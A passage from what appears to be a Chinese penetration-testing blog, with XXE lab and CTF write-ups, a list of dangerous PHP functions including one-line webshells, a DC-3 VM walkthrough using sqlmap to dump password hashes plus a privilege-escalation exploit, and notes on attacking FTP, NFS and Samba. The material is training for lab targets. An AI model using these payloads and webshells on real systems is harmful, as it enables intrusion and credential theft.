title="pikachu靶场"></a>pikachu靶场</h4><h5 id="pikachu靶场简介"><a href="#pikachu靶场简介" class="headerlink" title="pikachu靶场简介"></a>pikachu靶场简介</h5><p>​     Pikachu是一个带有漏洞的Web应用系统，在这里包含了常见的web安全漏洞。如果你是一个Web渗透测试学习人员且正发愁没有合适的靶场进行练习，那么Pikachu可能正合你意。</p><h5 id="XXE漏洞利用进行文件读取"><a href="#XXE漏洞利用进行文件读取" class="headerlink" title="XXE漏洞利用进行文件读取"></a>XXE漏洞利用进行文件读取</h5><p>我们首先在本地进入网站，选择XXE模块</p><img src="QQ截图20200123165140.png" style="zoom: 50%;" /><p>构造利用payload</p><img src="QQ截图20200123170052.png" style="zoom:67%;" /><p>将payload填入输入框进行提交</p><img src="QQ截图20200123165827.png" style="zoom:50%;" /><p>可见我们提交的内容显现在了页面。</p><p>我们在D盘下新建一个1.txt文件，内容为：</p><img src="QQ截图20200123170613.png" style="zoom: 80%;" /><p>然后构造利用代码：</p><img src="QQ截图20200123171804.png" style="zoom:80%;" /><p>提交，我们可以成功读取到本地1.txt文件的内容</p><img src="QQ截图20200123170601.png" style="zoom: 67%;" /><h4 id="CTF-jarvisoj-xxe"><a href="#CTF-jarvisoj-xxe" class="headerlink" title="CTF-jarvisoj(xxe)"></a>CTF-jarvisoj(xxe)</h4><p>我们进入题目，发现有一个输出框</p><img src="QQ截图20200202185412.png" style="zoom: 80%;" /><p>我们输入任意内容然后进行抓包</p><img src="QQ截图20200202185424.png" style="zoom: 80%;" /><p>将Content-Type的值改为application/xml，然后提交xml发现能够被解析</p><p>我们构造payload读取目标机器/home/ctf/flag.txt中的flag值。</p><pre><code>&lt;!DOCTYPE foo [    &lt;!ENTITY xxe SYSTEM &quot;file:///home/ctf/flag.txt&quot; &gt;]&gt;&lt;root&gt;    &lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;</code></pre><img src="QQ截图20200202185528.png" style="zoom:67%;" /><p>可以看到成功读取。</p><h4 id="BWAPP-（XXE部分）"><a href="#BWAPP-（XXE部分）" class="headerlink" title="BWAPP （XXE部分）"></a>BWAPP （XXE部分）</h4><p>我们先点击黑体字获取XXE攻击脚本。</p><img src="QQ截图20200128170206.png" style="zoom:67%;" /><p><img src="QQ%E6%88%AA%E5%9B%BE20200128170255.png" alt=""></p><p>然后使用Burp抓包后发送到Repeater模块</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200128171953.png" alt=""></p><p><strong>第一次我们使用http协议读取robots.txt文件内容</strong></p><p><img src="QQ%E6%88%AA%E5%9B%BE20200128175808.png" alt=""></p><p><strong>第二次我们使用php协议读取 xml页面中的内容</strong></p><p><img src="QQ%E6%88%AA%E5%9B%BE20200128175940.png" alt=""></p><p><strong>第三次我们使用file协议读取本机的/etc/passwd的内容</strong></p><img src="QQ截图20200128180043.png" style="zoom:67%;" />]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP危险函数总结</title>
      <link href="/2020/04/02/php-wei-xian-han-shu-zong-jie/"/>
      <url>/2020/04/02/php-wei-xian-han-shu-zong-jie/</url>
      
        <content type="html"><![CDATA[<h2 id="php危险函数总结"><a href="#php危险函数总结" class="headerlink" title="php危险函数总结"></a>php危险函数总结</h2><h4 id="什么是危险函数"><a href="#什么是危险函数" class="headerlink" title="什么是危险函数"></a>什么是危险函数</h4><p>​    函数设计出来就是让人使用的，之所以危险，是因为其功能过于强大。开发人员特别是刚从业的人员很少很少会完整阅读整个文档，再或者是没有意识到当给这些函数传递一些非常规的，外部可控的参数会带来什么影响。</p><pre><code>$_GET            $POST$_fILES$_COOKIE$_REQUEST        $_SERVER        $_SESSION    </code></pre><h4 id="执行任意代码的函数"><a href="#执行任意代码的函数" class="headerlink" title="执行任意代码的函数"></a>执行任意代码的函数</h4><ul><li>eval函数</li><li>assert函数</li><li>create_function 函数</li><li>preg_replace 函数</li><li>call_user_func/call_user_func_array函数</li><li>array_map函数</li><li>array_filter函数</li><li>usort/uasort函数</li><li>$a($b)动态函数</li></ul><h5 id="eval函数"><a href="#eval函数" class="headerlink" title="eval函数"></a>eval函数</h5><p>eval() 函数把字符串按照 PHP 代码来计算。</p><p>该字符串必须是合法的 PHP 代码，且必须以分号结尾。</p><p><strong>注释：</strong>return 语句会立即终止对字符串的计算。</p><p><strong>提示：</strong>该函数对于在数据库文本字段中供日后计算而进行的代码存储很有用。</p><pre><code>&lt;?php$string = &quot;beautiful&quot;;$time = &quot;winter&quot;;$str = &#39;This is a $string $time morning!&#39;;eval(&quot;\$str = \&quot;$str\&quot;;&quot;);echo $str;输出为：This is a beautiful winter morning! </code></pre><p><strong>简单的一句话木马：</strong><?php eval($_POST['CMD']);?></p><h5 id="assert函数"><a href="#assert函数" class="headerlink" title="assert函数"></a>assert函数</h5><p>assert——检测一个 断言是否为FALSE</p><p>如果参数为字符串，它将会被assert()当做php代码来执行</p><p>版本只能为：5.x</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">function</span> fo<span class="token punctuation">{</span>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string">"shell.php"</span><span class="token punctuation">,</span> <span class="token string">"&lt;?php phpinfo() ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$func</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"func"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">assert</span><span class="token punctuation">(</span><span class="token string">"$func()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>如果我们提交?func=fo，即可写入shell.php</p><h5 id="create-function函数"><a href="#create-function函数" class="headerlink" title="create_function函数"></a>create_function函数</h5><p>create_function(string $args, string $code)</p><p>适用范围：<code>PHP 4&gt; = 4.0.1</code>，<code>PHP 5</code>，<code>PHP 7</code></p><p>功能：根据传递的参数创建匿名函数，并为其返回唯一名称。</p><pre><code>&lt;?php$id=$_GET[&#39;id&#39;];$str2=&#39;echo&#39;.$a.&#39;&quot;test&quot;&#39;.$id.&quot;;&quot;;$f1 = create_function(&#39;$a&#39;, $str2);$f1(&quot;abc&quot;);?&gt;</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200218123543.png" alt=""></p><h5 id="preg-replace函数"><a href="#preg-replace函数" class="headerlink" title="preg_replace函数"></a>preg_replace函数</h5><p>preg_replace($pattern,$replacement,$subject,$limit,$count)</p><p>示例1：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/test/e"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"a"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"this is a test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>当我们所要匹配的字符串中含有test时</p><p>我们直接传入参数？a=phpinfo()即可执行代码。</p><p>示例2：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/\s*\[php\](.+?)\[\/php\]\s*/ies"</span><span class="token punctuation">,</span> <span class="token string">'test("\1")'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"h"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200218125837.png" alt=""></p><h5 id="call-user-func-call-user-func-array函数"><a href="#call-user-func-call-user-func-array函数" class="headerlink" title="call_user_func/call_user_func_array函数"></a>call_user_func/call_user_func_array函数</h5><p>call_user_func($callback,$parameter)</p><p>调用一个回调函数处理字符串,</p><p>call_user_func_array($callback,$param arr)</p><p>利用回调函数处理数组。</p><p><strong>示例1：</strong></p><img src=QQ截图20200218130741.png /><img src="QQ截图20200218130753.png" style="zoom:67%;" /><p><strong>示例2：</strong></p><p>一句话木马：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>@<span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token string">"assert"</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200218131820.png" alt=""></p><h5 id="array-map函数"><a href="#array-map函数" class="headerlink" title="array_map函数"></a>array_map函数</h5><p>array_map（$callback,$array1)</p><p>​    作用是为数组的每个元素应用回调函数 。其返回值为数组，是为 array1 每个元素应用 callback函数之后的数组。 callback 函数形参的数量和传给 array_map() 数组数量，两者必须一样。</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$func</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"func"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$cmd</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$cmd</span><span class="token punctuation">;</span><span class="token variable">$new_array</span><span class="token operator">=</span><span class="token function">array_map</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre> <img src="QQ截图20200218133234.png"  /><h5 id="array-filter函数"><a href="#array-filter函数" class="headerlink" title="array_filter函数"></a>array_filter函数</h5><p>array_filter() 函数用回调函数过滤数组中的元素。</p><p>该函数把输入数组中的每个键值传给回调函数。如果回调函数返回 true，则把输入数组中的当前键值返回给结果数组。数组键名保持不变。</p><p>语法：array array_filter ( array $array [, callable $callback [, int $flag = 0 ]] )</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$cmd</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$array1</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$func</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'func'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">array_filter</span><span class="token punctuation">(</span><span class="token variable">$array1</span><span class="token punctuation">,</span><span class="token variable">$func</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><img src="QQ截图20200218202542.png" style="zoom:67%;" /><h5 id="usort-uasort函数"><a href="#usort-uasort函数" class="headerlink" title="usort/uasort函数"></a>usort/uasort函数</h5><p><strong>usort</strong></p><p>使用用户自定义的比较函数对数组中的值进行排序 </p><p>usort(array, cmp_function)；</p><p>uasort(array, cmp_function)；</p><h5 id="a-b动态函数"><a href="#a-b动态函数" class="headerlink" title="$a$b动态函数"></a>$a$b动态函数</h5><h4 id="读取网络资源的函数"><a href="#读取网络资源的函数" class="headerlink" title="读取网络资源的函数"></a>读取网络资源的函数</h4><p>常见的php读取远程文件的方式</p><ul><li><p><strong>Fopen()</strong></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$handle</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span>"http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//www.baidu.com","rb");</span><span class="token variable">$contents</span><span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$handle</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$contents</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$handle</span><span class="token punctuation">,</span> <span class="token number">8192</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$handle</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$contents</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre></li></ul><ul><li><strong>file_get_content()</strong></li></ul><ul><li><strong>curl</strong></li></ul><h4 id="php命令执行函数"><a href="#php命令执行函数" class="headerlink" title="php命令执行函数"></a>php命令执行函数</h4><h5 id="system函数"><a href="#system函数" class="headerlink" title="system函数"></a>system函数</h5><p>system():执行外部程序，并且返回输出</p><h5 id="shell-exec-没有回显的命令执行"><a href="#shell-exec-没有回显的命令执行" class="headerlink" title="shell_exec(没有回显的命令执行)"></a>shell_exec(没有回显的命令执行)</h5><p>shell_exec():通过shell环境，并且将完整的输出以字符串方式返回</p><h5 id="passthru函数"><a href="#passthru函数" class="headerlink" title="passthru函数"></a>passthru函数</h5><p>执行外部程序并且显示原始输出</p><h5 id="exec函数"><a href="#exec函数" class="headerlink" title="exec函数"></a>exec函数</h5><p>​    exec():执行一个外部程序 </p><h5 id="ob-start函数"><a href="#ob-start函数" class="headerlink" title="ob_start函数"></a>ob_start函数</h5><h4 id="操作文件的函数"><a href="#操作文件的函数" class="headerlink" title="操作文件的函数"></a>操作文件的函数</h4><p>常见文件操作函数</p><ul><li><strong>Copy()</strong></li></ul><p>copy() 函数拷贝文件</p><p>语法：copy(source,destination)</p><pre><code>&lt;?phpecho copy(&quot;source.txt&quot;,&quot;target.txt&quot;);?&gt;</code></pre><p>输出1。</p><ul><li><p><strong>File_get_contents()/File_put_contents</strong></p><ul><li><p>file_get_contents() 把整个文件读入一个字符串中。</p><p>语法：file_get_contents(path,include_path,context,start,max_length)</p><pre><code>&lt;?phpecho file_get_contents(&quot;test.txt&quot;);?&gt;</code></pre></li><li><p>file_put_contents() 函数把一个字符串写入文件中。</p><p>语法：int file_put_contents ( string $filename , mixed $data [, int $flags = 0 [, resource $context ]] )</p><pre><code>&lt;?phpecho file_put_contents(&quot;sites.txt&quot;,&quot;Runoob&quot;);?&gt;</code></pre></li></ul></li><li><p><strong>File()</strong></p><ul><li><p>file() 函数把整个文件读入一个数组中。</p><p>数组中的每个元素都是文件中相应的一行，包括换行符在内</p><p>语法：file(path,include_path,context)</p><pre><code>&lt;?phpprint_r(file(&quot;test.txt&quot;));?&gt;</code></pre></li></ul></li><li><p><strong>Fopen()</strong></p><ul><li><p>open() 函数打开一个文件或 URL。</p><p>如果 fopen() 失败，它将返回 FALSE 并附带错误信息。您可以通过在函数名前面添加一个 ‘@’ 来隐藏错误输出。</p><p>语法：fopen(filename,mode,include_path,context)</p><pre><code>&lt;?php$file = fopen(&quot;test.txt&quot;,&quot;r&quot;);$file = fopen(&quot;/home/test/test.txt&quot;,&quot;r&quot;);$file = fopen(&quot;/home/test/test.gif&quot;,&quot;wb&quot;);$file = fopen(&quot;http://www.example.com/&quot;,&quot;r&quot;);$file = fopen(&quot;ftp://user:password@example.com/test.txt&quot;,&quot;w&quot;);?&gt;</code></pre></li></ul></li><li><p><strong>Move_uploaded_file()</strong></p><ul><li><p>move_uploaded_file() 函数把上传的文件移动到新位置。</p><p>如果成功该函数返回 TRUE，如果失败则返回 FALSE。</p><p>语法：move_uploaded_file(file,newloc)</p></li></ul></li><li><p><strong>Readfile()</strong></p><ul><li><p>readfile() 函数读取一个文件，并写入到输出缓冲。</p><p>语法：readfile(filename,include_path,context)</p><pre><code>&lt;?phpecho readfile(&quot;test.txt&quot;);?&gt;</code></pre></li></ul></li><li><p><strong>Rename()</strong></p><ul><li><p>rename() 函数重命名文件或目录。</p><p>如果成功，该函数返回 TRUE。如果失败，则返回 FALSE。</p><p>语法：rename(oldname,newname,context)</p><pre><code>&lt;?phprename(&quot;images&quot;,&quot;pictures&quot;);?&gt;</code></pre></li></ul></li><li><p><strong>Unlink()</strong></p><ul><li><p>unlink() 函数删除文件。</p><p>如果成功，该函数返回 TRUE。如果失败，则返回 FALSE。</p><p>语法：unlink(filename,context)</p><pre><code>&lt;?php$file = &quot;test.txt&quot;;if (!unlink($file)){echo (&quot;Error deleting $file&quot;);}else{echo (&quot;Deleted $file&quot;);}?&gt;</code></pre></li></ul></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>DC-6靶机</title>
      <link href="/2020/03/31/dc-6-ba-ji/"/>
      <url>/2020/03/31/dc-6-ba-ji/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>DC-3靶机</title>
      <link href="/2020/03/12/dc-3-ba-ji/"/>
      <url>/2020/03/12/dc-3-ba-ji/</url>
      
        <content type="html"><![CDATA[<h2 id="DC-3靶机学习"><a href="#DC-3靶机学习" class="headerlink" title="DC-3靶机学习"></a>DC-3靶机学习</h2><p>[TOC]</p><h4 id="第一步、靶机安装与主机发现"><a href="#第一步、靶机安装与主机发现" class="headerlink" title="第一步、靶机安装与主机发现"></a>第一步、靶机安装与主机发现</h4><p>我们打开靶机，首先设置.nat连接，然后打开kali攻击机</p><p>使用nmap进行二层主机发现</p><pre><code>nmap -sn 192.168.153.1/24</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200215121855.png" alt=""></p><h4 id="第二步、端口扫描与信息收集"><a href="#第二步、端口扫描与信息收集" class="headerlink" title="第二步、端口扫描与信息收集"></a>第二步、端口扫描与信息收集</h4><p>使用nmap进行简单的系统版本检测扫描。</p><pre><code>nmap -sV 192.168.153.153</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200215121959.png" alt=""></p><p>发现80端口开放且运行Apache服务。</p><p>我们网页访问IP的80端口</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200215122332.png" alt=""></p><p>使用Wappalyzer进行指纹识别，发现使用的Joomla系统建站。</p><h4 id="第三步、joomscan扫描"><a href="#第三步、joomscan扫描" class="headerlink" title="第三步、joomscan扫描"></a>第三步、joomscan扫描</h4><p>​        OWASPJoomla！漏洞扫描器（JoomScan）是一个开源项目，其主要目的是实现漏洞检测的自动化，以增强Joomla CMS开发的安全性。该工具基于Perl开发，能够轻松无缝地对各种Joomla项目进行漏洞扫描，其轻量化和模块化的架构能够保证扫描过程中不会留下过多的痕迹。它不仅能够检测已知漏洞，而且还能够检测到很多错误配置漏洞和管理权限漏洞等等。除此之外，OWASP JoomScan使用起来非常简单，不仅提供了非常友好的用户界面，而且还能够以HTML或文本格式导出扫描报告</p><pre><code>  不知道为什么，我的kali里好像没有这个工具。。。</code></pre><p>我们从github上根据教程安装下载后。使用命令检测joomla的相关配置</p><pre><code>perl joomscan.pl -u http://192.168.153.153</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200215123552.png" alt=""></p><p>我们得到了该Joomla的具体版本号为3.7.0.</p><h4 id="第四步、searchsploit工具查找漏洞"><a href="#第四步、searchsploit工具查找漏洞" class="headerlink" title="第四步、searchsploit工具查找漏洞"></a>第四步、searchsploit工具查找漏洞</h4><p>使用searchsploit工具查找Joomla 3.7.0 版本存在的漏洞。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200215123726.png" alt=""></p><p>发现存在一个sql注入漏洞。</p><p>我们将该漏洞文档复制到根目录下，然后打开。</p><pre><code>cp /usr/share/exploitdb/exploits/php/webapps/42033.txt joomla-sql.txtcat joomla-sql.txt</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200215124403.png" alt=""></p><p>文档中给出了sqlmap自动注入的payload.</p><h4 id="第五步、sqlmap自动注入"><a href="#第五步、sqlmap自动注入" class="headerlink" title="第五步、sqlmap自动注入"></a>第五步、sqlmap自动注入</h4><p>使用sqlmap自动注入工具对靶机执行sql注入代码。</p><ul><li>查询所有数据库：</li></ul><pre><code>sqlmap -u &quot;http://192.168.153.153/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200215124833.png" alt=""></p><p>查询当前使用数据库：</p><pre><code>sqlmap -u &quot;http://192.168.153.153/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --current-db -p list[fullordering]</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200215124955.png" alt=""></p><p>查询joomladb数据库下的表：</p><pre><code>sqlmap -u &quot;http://192.168.153.153/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D &quot;joomladb&quot; --tables  -p list[fullordering]</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200215125207.png" alt=""></p><p>我们判断users表中应该有我们想要的账号密码，查询该表中的列：</p><pre><code>sqlmap -u &quot;http://192.168.153.153/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D &quot;joomladb&quot; -T &quot;#__users&quot; --columns  -p list[fullordering]</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200215125855.png" alt=""></p><p>最后我们输出name,password的信息：</p><pre><code>sqlmap  -u &quot;http://192.168.153.153/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D &quot;joomladb&quot; -T &quot;#__users&quot; -C &quot;name,password&quot; --dump  -p list[fullordering]</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200215130011.png" alt=""></p><h4 id="第六步、后台反弹getshell"><a href="#第六步、后台反弹getshell" class="headerlink" title="第六步、后台反弹getshell"></a>第六步、后台反弹getshell</h4><p>我们首先利用使用john爆破hash值：snoopy</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200215130350.png" alt=""></p><p>使用dirsearch扫出后台文件</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200215133942.png" alt=""></p><p>进入后台登录页面并登录</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200215134103.png" alt=""></p><p>选择Templates模板，选择templates第一个模板即可，</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200215134629.png" alt=""></p><p>用weevely生成php后门文件.</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200215142748.png" alt=""></p><p><img src="QQ%E6%88%AA%E5%9B%BE20200215142836.png" alt=""></p><p><img src="QQ%E6%88%AA%E5%9B%BE20200215144846.png" alt=""></p><p>复制代码新建webshell.php文件，粘贴代码，保存</p><p>然后用weevely连，成功拿到shell.</p><h4 id="第七步、提权"><a href="#第七步、提权" class="headerlink" title="第七步、提权"></a>第七步、提权</h4><p>​    使用uname命令可知系统内核</p><p>Ubuntu 16.04，我们可以尝试使用kali自带的earchsploit工具查找Ubuntu 16.04的提权漏洞。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200215145305.png" alt=""></p><p>我们将这个漏洞的详细文件复制到root根目录下，然后查看</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200218161711.png" alt=""></p><p>我们将exp下载下来然后经过一系列的解压后</p><pre><code>unzip 39772.zip cd 39772tar -xvf exploit.tar  cd ebpf_mapfd_doubleput_exploit</code></pre><p>依次执行./compile.sh   </p><p>​                ./doubleput</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200218161152.png" alt=""></p><p>但是不知道为什么一直没法成功。。。。。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>端口渗透总结</title>
      <link href="/2020/03/12/duan-kou-shen-tou-zong-jie/"/>
      <url>/2020/03/12/duan-kou-shen-tou-zong-jie/</url>
      
        <content type="html"><![CDATA[<h2 id="端口渗透总结"><a href="#端口渗透总结" class="headerlink" title="端口渗透总结"></a>端口渗透总结</h2><h4 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h4><p>口渗透过程中我们需要关注几个问题：</p><p>1、 端口的banner信息</p><p>2、 端口上运行的服务</p><p>3、 常见应用的默认端口</p><p>当然对于上面这些信息的获取，我们有各式各样的方法，最为常见的应该就是nmap了吧！我们也可以结合其他的端口扫描工具，比如专门的3389、1433等等的端口扫描工具；</p><h4 id="服务默认端口"><a href="#服务默认端口" class="headerlink" title="服务默认端口"></a>服务默认端口</h4><p>公认端口(Well Known Ports)：0-1023，他们紧密绑定了一些服务；</p><p>注册端口(Registered Ports)：1024-49151，他们松散的绑定了一些服务；</p><p>动态/私有：49152-65535，不为服务分配这些端口；</p><p>当然这些端口都可以通过修改来达到欺骗攻击者的目的，但是这就安全了吗？攻击者又可以使用什么攻击方式来攻击这些端口呢？</p><p>还需要注明的一点是：很多木马工具也有特定的端口</p><h3 id="文件共享服务端口渗透"><a href="#文件共享服务端口渗透" class="headerlink" title="文件共享服务端口渗透"></a>文件共享服务端口渗透</h3><h5 id="ftp服务"><a href="#ftp服务" class="headerlink" title="ftp服务"></a>ftp服务</h5><p>FTP服务：ftp服务我分为两种情况，第一种是使用系统软件来配置，比如IIS中的FTP文件共享或Linux中的默认服务软件；第二种是通过第三方软件来配置，比如Serv-U还有一些网上写的简易ftp服务器等；</p><p>默认端口：20（数据端口）；21（控制端口）；69（tftp小型文件传输协议）</p><p>攻击方式：</p><p>爆破：ftp的爆破工具有很多，这里我推荐owasp的<a href="https://sourceforge.net/projects/worawita/" target="_blank" rel="noopener">Bruter</a> 以及msf中ftp爆破模块；</p><p>匿名访问：用户名：anonymous 密码：为空或任意邮箱</p><p>用户名：FTP      密码：FTP或为空</p><p>用户名：USET     密码：pass</p><p>当然还有不需要用户名密码直接访问的，一般出现在局域网中；</p><p>嗅探：ftp使用明文传输技术（但是嗅探给予局域网并需要欺骗或监听网关）</p><p>后门技术：在linux的vsftp某一版本中，存在着一个后门程序，只要在用户名后面加上 就会在6200上打开一个监听Shell，我们可以使用telnet直接连接；详细<a href="http://www.freebuf.com/articles/system/34571.html" target="_blank" rel="noopener">请点击</a></p><p>远程溢出漏洞：6.10.1 IIS FTP远程溢出漏洞，在IIS FTP服务器中NLST命令存在一个缓冲区溢出漏洞，这个漏洞可能是攻击者在服务器运行一条非法命令。</p><p>跳转攻击：（Bounce Attacks）攻击者发送一个FTP”PORT”命令给目标FTP服务器，其中包含该主机的网络地址和被攻击的服务的端口号。这样，客户端就能命令FTP服务器发一个文件给被攻击的服务。这个文件可能包括根被攻击的服务有关的命令（如SMTP,NNTP等）。由于是命令第三方去连接到一种服务，而不是直接连接，就使得跟踪攻击者变得困难，并且还避开了基于网络地址的访问限制。</p><p>案例分享：</p><p><a href="http://www.wooyun.org/bugs/wooyun-2015-0116499" target="_blank" rel="noopener">山东电信Serv-U Web客户端弱口令</a></p><p><a href="http://www.wooyun.org/bugs/wooyun-2010-0102552" target="_blank" rel="noopener">长虹ftp弱口令导致全网数据泄漏</a></p><h5 id="NFS服务"><a href="#NFS服务" class="headerlink" title="NFS服务"></a>NFS服务</h5><p>nfs：网络文件系统，允许网络中的计算机通过TCP/IP网络共享资源。基于Linux系统，配置方面很简单，详细配置请参考案例分享。在nfs配置中，有不做任何限制的，有限制用户，有限制IP，以及在版本2.x中我们还可以使用证书来验证用户。当然不同的限制可以采用的攻击方式也不一样；就目前而言网上关于nfs的攻击还是比较少的!</p><p>默认端口：2049</p><p>攻击方式：</p><p>未授权访问：未限制IP以及用户权限设置错误</p><p>案例分享：</p><p><a href="http://drops.wooyun.org/tips/8659" target="_blank" rel="noopener">Nfs配置不当导致被入侵</a></p><p><a href="http://www.360doc.com/content/11/0410/14/2054285_108598426.shtml" target="_blank" rel="noopener">NFS服务全攻略</a></p><h5 id="Samba服务"><a href="#Samba服务" class="headerlink" title="Samba服务"></a>Samba服务</h5><p>Samba服务：对于这个可以在windows与Linux之间进行共享文件的服务同样是我们攻击的关注点；samba登录分为两种方式，一种是需要用户名口令；另一种是不需要用户名口令。在很多时候不光是pc机，还有一些服务器，网络设备都开放着此服务，方便进行文件共享，但是同时也给攻击者提供了便利。</p><p>默认端口：137（主要用户NetBIOS Name Service；NetBIOS名称服务）、139（NetBIOS Session Service，主要提供samba服务）</p><p>攻击方式：</p><p>爆破：弱口令（爆破工具采用hydra）hydra -l username -P<br>PassFile IP smb</p><p>未授权访问：给予public用户高权限</p><p>远程代码执行漏洞：CVE-2015-0240等等</p><p>案例分享：</p><p><a href="http://www.secpulse.com/archives/5975.html" target="_blank" rel="noopener">Samba远程代码执行漏洞</a></p><p><a href="http://tech.soft6.com/667/10/45861.html" target="_blank" rel="noopener">未授权访问文件系统漏洞</a></p><h5 id="LDAP"><a href="#LDAP" class="headerlink" 